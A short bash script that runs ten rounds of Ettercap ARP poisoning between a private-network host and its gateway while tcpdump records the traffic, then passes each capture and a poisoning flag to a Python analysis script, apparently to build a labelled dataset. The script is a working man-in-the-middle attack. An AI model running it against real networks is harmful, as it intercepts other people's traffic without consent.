#!/bin/bash

for i in $(seq 1 10); do
    INTERFACE="eth0"
    TARGET1="192.168.1.101"
    TARGET2="192.168.1.1"
    PCAP_FILE="capture.pcap"
    LOG="ettercap.log"

    echo "[*] Starting packet capture..."
    sudo tcpdump -i "$INTERFACE" -w "$PCAP_FILE" > /dev/null 2>&1 &
    TCPDUMP_PID=$!

    sleep 2

    echo "[*] Starting Ettercap..."
    sudo ettercap -T -i "$INTERFACE" -M arp:remote "//$TARGET1//" "//$TARGET2//" > "$LOG" 2>&1 &
    ETTERCAP_PID=$!

    sleep 10

    echo "[*] Stopping processes..."
    kill $ETTERCAP_PID
    kill $TCPDUMP_PID
    sleep 2

    if [ ! -s "$PCAP_FILE" ]; then
        echo "[!] PCAP file is empty or not created"
        exit 1
    fi

    if grep -q "ARP poisoning" "$LOG"; then
        MITM_STATUS=1
    else
        MITM_STATUS=0
    fi

    python3 scan_packets.py "$PCAP_FILE" $MITM_STATUS

    echo "[*] Iteration $i complete."
    echo " "
    echo " "
    echo " "
    echo " "
    echo " "
    sleep 5
done

echo "All iterations done. Data saved in analysis.csv"
